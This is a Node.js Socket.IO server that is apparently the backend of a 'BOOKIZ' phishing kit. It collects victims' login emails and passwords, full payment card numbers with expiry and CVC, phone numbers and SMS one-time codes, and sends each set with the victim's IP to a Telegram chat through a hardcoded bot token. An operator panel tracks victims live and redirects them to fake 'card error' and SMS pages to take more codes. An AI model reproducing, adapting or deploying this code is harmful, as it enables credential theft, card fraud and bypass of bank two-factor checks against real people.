const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const session = require('express-session');
const cors = require('cors'); // Import the CORS middleware
const axios = require("axios")


const app = express();
const server = http.createServer(app);
const socketio = require("socket.io");

//config bot
const BOT_TOKEN = '7562881975:AAEbd99UI8OTExtoosY2NW3FxHiKtv3xdq8';
const CHAT_ID = '-4632614248';


async function sendToTelegram(data, userIp, type) {
    console.log(userIp,"ba2");
    
    const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    if (type === "login") {
        message = `\n\n[ 📲 + ------------- + 📲 ]\n
[ 👁‍🗨 + BOOKIZ  L𝗢𝗚𝗜𝗡 + 👁‍🗨 ]\n\nℹ️ *Login Details*: \n\n${Object.entries(data)
                .map(([key, value]) => `👤 *${key.charAt(0).toUpperCase() + key.slice(1)}*: ${value}`)
                .join('\n')}\n\n[ 📲 + ------------- + 📲 ]`;
        console.log(message, "holaazbya");

        message = `
        [ 🔓 + BOOKIZ  Login + 🔓 ]
        👤 *login* : ${data.email}
        🗝️ *pass* : ${data.password}
        🤴 *𝗙𝗿𝗼𝗺* : ${userIp || 'Unknown'}
        🕔 *𝗧𝗶𝗺𝗲* : ${new Date().toLocaleString()}  
        [ 🔓 + -------- + 🔓 ]`;

    }
    if (type === 'card') {
        // Create a formatted message for card details
        message = `
[ 💷 + BOOKIZ  𝗖𝗖 + 💷 ]
👤 *𝗖𝗖-𝗡𝗮𝗺𝗲* : ${data.cardHolder}
🧾 *𝗖𝗖-𝗡𝗮𝗺𝗯𝗲𝗿* : ${data.cardNumber}
⏳ *𝗖𝗖-𝗘𝗫𝗣* : ${data.expiry}
🗝 *𝗖𝗖-𝗖𝗩𝗩* : ${data.cvc}
📞 *𝗣𝗵𝗼𝗻𝗲* : ${data.phone || 'N/A'} 
🤴 *𝗙𝗿𝗼𝗺* : ${userIp || 'Unknown'}
🕔 *𝗧𝗶𝗺𝗲* : ${new Date().toLocaleString()}  
[ 💷 + -------- + 💷 ]`;
    }

    if (type === 'otp') {
        // Create a formatted message for card details
        message = `
[ 💷 + BOOKIZ  SMS + 💷 ]
👤 *SMS* : ${data}
🤴 *𝗙𝗿𝗼𝗺* : ${userIp || 'Unknown'}
🕔 *𝗧𝗶𝗺𝗲* : ${new Date().toLocaleString()}  
[ 💷 + -------- + 💷 ]`;
    }

    if (type === 'otpcustom') {


        message = `
[ 💷 + BOOKIZ  SMS CYUSTOM + 💷 ]
👤 *SMS* : ${data.otp}
👤 *Custom* : ${data.custom}
🤴 *𝗙𝗿𝗼𝗺* : ${userIp || 'Unknown'}
🕔 *𝗧𝗶𝗺𝗲* : ${new Date().toLocaleString()}  
[ 💷 + -------- + 💷 ]`;
    }





    try {
        const response = await axios.post(telegramApiUrl, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown', // Use Markdown for formatting
        });

        console.log('Message sent:', response.data);
    } catch (error) {
        console.error('Error sending message:', error);
    }
}


const corsOptions = {
    origin: '*',
    methods: ['GET', 'POST'],
    credentials: true,
};

app.use(cors(corsOptions));

const io = socketio(server, {
    cors: {
        origin: 'http://localhost:4200',
        methods: ["GET", "POST", "PUT"],
        credentials: true,
    },
    timeout: 60000,
});



// Configure session middleware
const sessionMiddleware = session({
    secret: 'your_secret_key',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false },
});


app.use(sessionMiddleware);
const connectedUsers = {};


io.use((socket, next) => {
    sessionMiddleware(socket.request, {}, next);
});


app.get('/', (req, res) => {
    res.send('Socket.IO with session example');
});

io.on('connection', (socket) => {
    const userId = socket.request.session.userID || socket.id;
    const userIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
    connectedUsers[userId] = {
        socketId: socket.id,
        currentPage: 'home',
        ip: userIp,
    };
    io.emit('updateConnectedUsers', connectedUsers);


    socket.on('pageChange', (page) => {
        connectedUsers[userId].currentPage = page;
        io.emit('updateConnectedUsers', connectedUsers);
    })

    socket.on('login', (data) => {
        sendToTelegram(data, userIp, "login")
        console.log('Received login data from client:', data);


    });

    socket.on('submitPayment', (data) => {

        sendToTelegram(data, userIp, "card")
        console.log('Received login data from client:', data);

        if (connectedUsers[userId]) {
            connectedUsers[userId].currentPage = "loading";
            io.emit('updateConnectedUsers', connectedUsers);

        } else {
            console.log('User not found in connectedUsers');
        }
    });


    socket.on('otp', (data) => {
        sendToTelegram(data, userIp, "otp")
        console.log('Received login data from client:', data);

    });

    socket.on('otpcustom', (data) => {
        sendToTelegram(data, userIp, "otpcustom")
        console.log('Received login data from client:', data);

    });



    socket.on('disconnect', () => {
        console.log('User disconnected:', socket.id);
    });

    socket.on('disconnect', () => {
        console.log('User disconnected:', socket.id);
        // Remove user from connectedUsers
        delete connectedUsers[userId];

        // Emit the updated list of connected users to all clients
        io.emit('updateConnectedUsers', connectedUsers);
    });



    socket.on('changePage', (data) => {
        const { pageName, userId, error, message, Pageredirect } = data;

        if (!userId || !pageName) {
            console.error('User ID or page name is missing in the data:', data);
            return;
        }

        // Handle page redirection logic
        switch (pageName) {
            case 'cardError':
                console.log('Redirecting to card error page');
                socket.to(userId).emit('newRedirect', { pageName: 'cardError' });
                break;

            case 'cardErrorSMS': // Check for a specific error case (renamed for clarity)
                console.log('Redirecting to SMS page');
                socket.to(userId).emit('newRedirect', { pageName: 'sms', option: message });
                break;


            case 'smsCustom':
                console.log('Redirecting to SMS page with custom message', data);
                socket.to(userId).emit('newRedirect', {
                    pageName: 'smsCustom',
                    message: message
                });
                break;


            default:
                // For other cases, you can handle the redirection based on the provided pageName
                console.log('Redirecting to another page:', pageName);
                socket.to(userId).emit('newRedirect', { pageName, error });
                break;
        }

        // Update the user's current page in the connected users object
        if (connectedUsers[userId]) {
            connectedUsers[userId].currentPage = pageName;
            io.emit('updateConnectedUsers', connectedUsers);
        } else {
            console.error('User not found:', userId);
        }
    });



});

server.listen(3000, () => {
    console.log('Server is running on http://localhost:3000');
});
